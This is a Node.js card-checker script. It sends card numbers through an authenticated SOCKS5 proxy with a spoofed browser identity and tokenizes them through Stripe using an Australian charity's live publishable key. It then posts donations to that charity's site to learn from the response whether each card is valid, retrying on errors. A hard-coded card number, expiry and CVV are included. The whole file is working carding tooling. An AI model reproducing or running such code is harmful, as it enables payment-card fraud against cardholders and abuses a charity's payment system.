const Agent = require("socks5-https-client/lib/Agent");
const request = require("request-promise");
const helper = require("./helper");
const fs = require("fs").promises;

class Process {
  constructor(cc, month, year, cvv) {
    return (async () => {
      const { HOSTNAME, PORT, USERNAME, PASSWORD } = helper.getProxy();
      this.HOSTNAME = HOSTNAME;
      this.PORT = PORT;
      this.USERNAME = USERNAME;
      this.PASSWORD = PASSWORD;

      const { firstName, lastName, email } = await helper.getAddress();
      this.firstName = firstName;
      this.lastName = lastName;
      this.email = email;

      this.cookieJar = request.jar();

      this.cc = cc;
      this.month = month;
      this.year = year.length < 4 ? year : year.substr(2, 2);
      this.cvv = cvv;

      return this; // when done
    })();
  }

  setOpts(url, additionalOpts) {
    if (!additionalOpts["header"])
      var headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
      };

    const options = {
      uri: url,
      jar: this.cookieJar,
      followAllRedirects: true,
      strictSSL: true,
      agentClass: Agent,
      simple: false,
      headers: headers,
      agentOptions: {
        socksHost: this.HOSTNAME, // Defaults to 'localhost'.
        socksPort: this.PORT, // Defaults to 1080.

        // Optional credentials
        socksUsername: this.USERNAME,
        socksPassword: this.PASSWORD,
      },
    };

    if (additionalOpts) {
      for (let key in additionalOpts) {
        options[key] = additionalOpts[key];
      }
    }

    // console.log(options);

    return options;
  }

  async preview(response) {
    fs.writeFile("index.html", response);
    console.log("Wrote to response index.html");
  }

  async getToken() {
    const URL = "https://api.stripe.com/v1/tokens";
    const POST_DATA = `email=${this.email}&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2F8ab9a2f)&referrer=https%3A%2F%2Fards.com.au%2Fdonate%2F&card[number]=${this.cc}&card[exp_month]=${this.month}&card[exp_year]=${this.year}&card[cvc]=${this.cvv}&card[name]=${this.firstName} ${this.lastName}&time_on_page=42287&guid=37b77d4f-4089-46ca-af08-c6c0025c1c8f&muid=9ea30338-0e88-4d3c-8648-5a0818719edd&sid=f171f61f-e919-4d01-9388-3b2ab0854f28&key=pk_live_uBUn2eFpPL9TZej98PJY7LRS`;
    const options = this.setOpts(URL, {
      body: POST_DATA,
      method: "POST",
      json: true,
    });

    const response = await request(options);

    if ("id" in response)
      return { success: true, result: { token: response.id } };

    return { success: false, result: response.error };
  }

  async checkCard(token) {
    const URL = "https://ards.com.au/donate/success/";
    const POST_DATA = `donation=1&email=${this.email}&token=${token}&from_page=161`;
    const options = this.setOpts(URL, {
      body: POST_DATA,
      method: "POST",
    });

    // console.log(POST_DATA);

    const response = await request(options);

    if (response.includes("Payment processing error"))
      return helper.getStr2(response, "Payment processing error: ", "<");

    console.log(response);
  }

  async execute() {
    try {
      const { success, result } = await this.getToken();
      if (!success) return `[${result.code}] ${result.message}`;
      const message = await this.checkCard(result.token);

      return message;
    } catch (error) {
      await this.execute();
    }

    // return { success, message };
  }
} // 5307723303258681|12|2021|710
(async () => {
  const process = await new Process("5307723303258681", "12", "2021", "710");

  const response = await process.execute();

  console.log(response);
})();
